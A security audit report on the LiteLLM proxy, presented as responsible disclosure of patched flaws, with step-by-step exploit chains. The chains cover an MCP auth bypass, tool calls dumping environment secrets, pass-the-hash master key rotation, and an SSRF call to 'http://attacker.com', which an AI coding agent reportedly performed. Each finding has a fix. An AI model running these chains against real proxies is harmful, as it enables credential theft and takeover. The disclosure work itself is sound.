# LiteLLM Proxy — Security Audit Report

**Auditor:** [AutoFyn](https://github.com/SignalPilot-Labs/AutoFyn)
**Date:** 2026-04-21 | **Commit:** `b9bedc8153` on `litellm_internal_staging`
**Target:** LiteLLM proxy v1.83.10 (PostgreSQL 15 backend)
**Method:** Automated code analysis + live exploitation with Claude Code

> **Responsible disclosure.** These findings are fixed in **LiteLLM v1.83.14-stable**. They were disclosed privately and patched before publication, and this report was released only after the fix had been public for over two weeks. Upgrade to v1.83.14-stable or later. No live, unpatched vulnerabilities are disclosed here.

All findings were live-confirmed against a running proxy instance.

---

## Summary of Findings

| ID | Title | Severity | Prerequisites |
|---|---|---|---|
| CHAIN-B-RCE | Zero-auth MCP bypass → full RCE | Critical | MCP server with `allow_all_keys: true` |
| CHAIN-1 | `/metrics` + pass-the-hash → proxy takeover | Critical | Prometheus on, metrics auth off, `internal_user` key |
| A-1/A-2 | MCP auth bypass → unauthenticated tool execution | Critical | MCP server with `allow_all_keys: true` |
| F-5 | `_is_master_key()` accepts hash → master key rotation | Critical | Master key hash + `internal_user` key |
| F-3 | Unauthenticated `/metrics/` leaks master key hash | High | Prometheus on, metrics auth off (default) |
| F-2 | `/spend/keys` returns all keys to any authenticated user | High | `internal_user` or `internal_user_viewer` key |
| F-6 | MCP OAuth discovery SSRF | High | Admin registers attacker-influenced MCP server |
| SSRF | `api_base` SSRF via `check_complete_credentials` bypass | High | Any valid API key |
| B-4 | `/global/spend` readable by any authenticated user | High | Any valid API key |
| B-5 | `/global/spend/teams` readable by any authenticated user | High | Any valid API key |
| F-4 | Unauthenticated `/token` endpoint | Medium | Stored malicious `token_url` via F-6 |
| Stack | Error responses include full Python tracebacks | Medium | Any valid API key |
| F-1 | Unauthenticated `/debug/asyncio-tasks` | Low | None |
| Header | `x-litellm-model-api-base` leaks backend URLs | Low | Any valid API key |

---

## Exploit Chains

### CHAIN-B-RCE: Zero-Credential MCP Auth Bypass → Full RCE (CVSS 10.0)

**Starting position:** Zero credentials
**Live result:** 5/5 steps confirmed

An unauthenticated attacker exploits the MCP OAuth2 header fallback to bypass authentication entirely, then leverages any shell/file MCP server (filesystem, terminal, code-interpreter) for full remote code execution.

```
1. POST /<mcp_server>/mcp with Authorization: Bearer <any-garbage-string>
   → user_api_key_auth raises 401 → caught at user_api_key_auth_mcp.py:136-142
   → UserAPIKeyAuth() (anonymous) substituted → allow_all_keys grants access

2. tools/list → attacker discovers run_command, read_file, list_directory

3. tools/call run_command {command: "env"}
   → dumps LITELLM_MASTER_KEY, DATABASE_URL, AWS_SECRET_ACCESS_KEY, etc.

4. tools/call read_file {path: "<proxy_config.yaml>"}
   → reads credential_list with provider API keys

5. POST /key/generate with stolen LITELLM_MASTER_KEY
   → attacker generates persistent admin API key
```

**Root cause:** `user_api_key_auth_mcp.py:127-153` — the OAuth2 header fallback catches 401/403 from `user_api_key_auth` and substitutes an empty `UserAPIKeyAuth()`. Any invalid bearer token bypasses authentication. Combined with `allow_all_keys: true`, the anonymous session gets full tool access.

**Impact:** Complete secret theft, persistent admin access, arbitrary command execution, lateral movement via DB credentials, and financial liability from stolen provider API keys.

### CHAIN-1: Proxy Takeover via `/metrics` + Pass-the-Hash

**Starting position:** `internal_user` API key + Prometheus enabled (default metrics auth off)
**Live result:** Full chain confirmed

```
1. Admin makes any request with master key → Prometheus labels record its SHA-256 hash
2. GET /metrics/ (no auth) → attacker extracts hashed_api_key="1c807cf78..."
3. POST /key/regenerate (Authorization: Bearer <internal_user_key>)
   Body: {"key": "<hash>", "new_master_key": "sk-attacker-value"}
   → 200 OK, master key rotated
```

**Root cause:** Two bugs combine. F-3: `/metrics/` is unauthenticated and embeds key hashes in labels. F-5: `_is_master_key()` in `spend_tracking_utils.py:55-69` compares against both plaintext and `hash_token()`, and `/key/regenerate` has no admin role check (`key_management_endpoints.py:3882-3939`).

### CHAIN-C: Low-Privilege User → Cross-Tenant Breach + SSRF (CVSS 7.7)

**Starting position:** One low-privilege `internal_user` API key
**Live result:** 5/6 steps confirmed

```
1. GET /global/spend → all-tenant financial data (no role check)
2. GET /global/spend/teams → per-team spend breakdowns (no role check)
3. GET /spend/keys → all API key hashes, user IDs, budgets, metadata
4. GET /global/spend/tags → error with traceback.format_exc(): file paths, DB details
5. POST /chat/completions → x-litellm-model-api-base header leaks backend URLs
6. POST /chat/completions with api_key="dummy", api_base="http://attacker.com"
   → check_complete_credentials accepts any non-empty api_key → SSRF
```

**Root cause:** Spend endpoints require authentication but have no role check. `check_complete_credentials` (`auth_utils.py:53-76`) accepts any non-empty string as `api_key`, bypassing the `api_base` ban.

---

## Individual Findings

### F-5: Pass-the-Hash Master Key Rotation — Critical

`spend_tracking_utils.py:55-69` — `_is_master_key()` accepts `hash_token(master_key)` as equivalent to the plaintext. `/key/regenerate` (`key_management_endpoints.py:3882-3939`) has no admin role check — any `internal_user` can rotate the master key.

**Fix:** Remove the hash comparison branch. Add `PROXY_ADMIN` role check before master key rotation.

### A-1/A-2: MCP Auth Bypass — Critical

`user_api_key_auth_mcp.py:127-153` — Invalid bearer token → `user_api_key_auth` raises 401 → caught → `UserAPIKeyAuth()` (anonymous) substituted. On `allow_all_keys: true` servers, this grants full tool access with zero valid credentials.

**Fix:** Remove the fallback that substitutes `UserAPIKeyAuth()` on auth failure. If the bearer token is not a valid LiteLLM key and not a valid OAuth2 token, reject the request.

### F-3: Unauthenticated `/metrics/` Leaks Master Key Hash — High

When Prometheus is enabled and `require_auth_for_metrics_endpoint` is unset (default), `/metrics/` is public. Labels include `hashed_api_key` — the SHA-256 of the caller's key for any request type.

**Fix:** Default `require_auth_for_metrics_endpoint` to `true`.

### F-2: `/spend/keys` Returns All Key Rows — High

`spend_management_endpoints.py:34-66` — `spend_key_fn()` has no `user_api_key_dict` param, returns all keys unfiltered. Accessible to `internal_user` and `internal_user_viewer`. Exposes key hashes, names, user/team IDs, budgets, metadata.

**Fix:** Add `user_api_key_dict` dependency, filter by caller role/user.

### F-6: MCP OAuth Discovery SSRF — High

`mcp_server_manager.py:1481-1704` — When admin registers an MCP server with `auth_type: oauth2`, the proxy follows the `resource_metadata` URL from the `WWW-Authenticate` header with no private-IP or scheme validation.

**Fix:** Apply `IPAddressUtils` blocklist and enforce `https://`.

### SSRF via `api_base` — High

`auth_utils.py:53-76` — `check_complete_credentials` returns `True` for any non-empty `api_key` string including `"dummy"`, bypassing the `api_base` ban. The proxy creates `AsyncOpenAI(api_key="dummy", base_url=<attacker_url>)` and sends a request.

**Fix:** Validate `api_key` format — reject dummy values that don't match real key patterns.

### B-4/B-5: Global Spend Endpoints Missing Role Check — High

`/global/spend` and `/global/spend/teams` require authentication but do not verify admin privileges. Any authenticated user reads all-tenant financial data.

**Fix:** Add admin role check to both endpoints.

### F-4: Unauthenticated `/token` — Medium

`discoverable_endpoints.py:589` — Public endpoint (intentional for OAuth) POSTs to stored `token_url` without URL validation. Combined with F-6, enables SSRF relay.

**Fix:** Add URL validation to `exchange_token_with_server()`.

### Stack Trace Disclosure — Medium

`spend_management_endpoints.py:1427-1444` — Error handler uses `traceback.format_exc()` in HTTP responses, exposing file paths, Python version, package versions, and DB connection details.

**Fix:** Remove `traceback.format_exc()` from error responses.

### F-1: Unauthenticated `/debug/asyncio-tasks` — Low

`debug_utils.py:53` — No `Depends(user_api_key_auth)`. Reveals DB type, alerting config, and monitoring tasks.

**Fix:** Add auth dependency.

### API Base Header Leak — Low

`x-litellm-model-api-base` response header on `/chat/completions` exposes backend provider URLs (Azure resource names, internal hostnames) unconditionally.

**Fix:** Gate the header to admin callers only.
